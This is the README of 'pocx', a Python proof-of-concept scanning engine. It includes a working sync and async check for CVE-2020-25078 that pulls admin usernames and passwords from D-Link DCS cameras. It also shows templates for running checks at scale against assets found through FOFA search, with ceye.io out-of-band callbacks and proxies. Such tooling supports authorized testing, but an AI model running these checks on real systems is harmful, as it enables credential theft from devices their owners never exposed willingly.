# pocx
A Simple, Fast and Powerful poc engine tools was built by antx, which support synchronous mode and asynchronous mode.

## Description
pocx is a simple, fast and powerful poc engine tools, which support synchronous mode and asynchronous mode. pocx also 
support some useful features, which like fofa search and parse assets to verify. You also can use smart method to verify 
some special assets by using ceyeio, which it is cannot return or display the result. 

## Install

```bash
pip3 install pocx
```

## Usage

### POC Template

```python
# Title: xxxxxxx
# Author: antx
# Email: 7877940+antx-code@users.noreply.github.com
# CVE: CVE-xxxx-xxxxx

from pocx import BasicPoc, AioPoc


class POC(BasicPoc):
    def __init__(self):
        self.name = 'poc'
        super(POC, self).__init__()

    def poc(self, target):
        """
        
        your poc code here.
        
        """
        return


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    cve = POC()
    cve.run(target)
```

### Synchronous Mode Example

```python
# Title: D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078
# Author: antx
# Email: 7877940+antx-code@users.noreply.github.com
# CVE: CVE-2020-25078

from pocx import BasicPoc
from loguru import logger


class DLinkPoc(BasicPoc):
    @logger.catch(level='ERROR')
    def __init__(self):
        self.name = 'D_Link-DCS-2530L'
        super(DLinkPoc, self).__init__()

    @logger.catch(level='ERROR')
    def poc(self, target: str):
        poc_url = '/config/getuser?index=0'
        try:
            resp = self.get(target + poc_url)
            if resp.status_code == 200 and 'name=' in resp.text and 'pass=' in resp.text and 'priv=' in resp.text:
                logger.success(resp.text)
            elif resp.status_code == 500:
                logger.error(f'[-] {target} {resp.status_code}')
        except Exception as e:
            logger.error(f'[-] {target} {e}')


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    cve = DLinkPoc()
    cve.run(target)
```

### Asynchronous Mode Example

```python
# Title: D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078
# Author: antx
# Email: 7877940+antx-code@users.noreply.github.com
# CVE: CVE-2020-25078

from pocx import AioPoc
from loguru import logger


class DLinkPoc(AioPoc):
    @logger.catch(level='ERROR')
    def __init__(self):
        self.name = 'D_Link-DCS-2530L'
        super(DLinkPoc, self).__init__()

    @logger.catch(level='ERROR')
    async def poc(self, target: str):
        poc_url = '/config/getuser?index=0'
        try:
            resp = await self.aio_get(target + poc_url)
            if resp.status_code == 200 and 'name=' in resp.text and 'pass=' in resp.text and 'priv=' in resp.text:
                logger.success(resp.text)
            elif resp.status_code == 500:
                logger.error(f'[-] {target} {resp.status_code}')
        except Exception as e:
            logger.error(f'[-] {target} {e}')


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    cve = DLinkPoc()
    cve.run(target)
```

### Useful Functions

#### FoFa

```python
# Title: xxxxxxx
# Author: antx
# Email: 7877940+antx-code@users.noreply.github.com
# CVE: CVE-xxxx-xxxxx

from pocx import BasicPoc, AioPoc
from pocx.funcs import Fofa


class POC(BasicPoc):
    def __init__(self):
        self.name = 'poc'
        super(POC, self).__init__()

    def poc(self, target):
        """
        
        your poc code here.
        
        """
        return


if __name__ == '__main__':
    grammar = 'app="xxxxxx"'
    cve = POC()
    fofa = Fofa()
    fofa.set_config(api_key='xxxxxx', api_email='xxxxxx')
    print(f'[+] the asset account of grammar: {grammar} are: {fofa.asset_counts(grammar)}')
    pages = fofa.asset_pages(grammar)
    for page in range(1, pages + 1):
        print(f'[*] page {page}')
        assets = fofa.assets(grammar, page)
        cve.run(assets)
```

#### Ceye

```python
# Title: xxxxxxx
# Author: antx
# Email: 7877940+antx-code@users.noreply.github.com
# CVE: CVE-xxxx-xxxxx

from pocx import BasicPoc, AioPoc
from pocx.funcs import Ceye


class POC(BasicPoc):
    def __init__(self):
        self.name = 'poc'
        super(POC, self).__init__()
        self.ceyeio = Ceye()
        
    def poc(self, target):
        pid = self.ceyeio.generate_payload_id()
        self.ceyeio.set_config(api_token='xxxxxx', identifier='xxxxxx.ceye.io')
    
        """
        
        your poc code here.
        
        """
        
        self.ceyeio.verify(pid, 'dns')
        return
```

#### Proxy

```python
# Title: xxxxxxx
# Author: antx
# Email: 7877940+antx-code@users.noreply.github.com
# CVE: CVE-xxxx-xxxxx

from pocx import BasicPoc, AioPoc
from pocx.funcs import Ceye


class POC(BasicPoc):
    def __init__(self):
        self.name = 'poc'
        super(POC, self).__init__()
        self.ceyeio = Ceye()

    def poc(self, target):
        pid = self.ceyeio.generate_payload_id()
        self.ceyeio.set_config(api_token='xxxxxx', identifier='xxxxxx.ceye.io')
        self.set_headers({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, '
                                        'like Gecko) Chrome/87.0.4280.88 Safari/537.36'})
        proxy = {
            'all://': 'http://127.0.0.1:7890',
        }
        
        """
        
        or use httpx support proxy:
        proxy = {
            'http://': 'http://127.0.0.1:7890',
            'https://': 'https://127.0.0.1:7890',
            }
        
        """
        
        self.set_proxies(proxy)

        """
        
        your poc code here.
        
        """

        self.ceyeio.verify(pid, 'dns')
        return
    

if __name__ == '__main__':
    target = 'http://127.0.0.1:8888'
    cve = POC()
    cve.run(target)
```
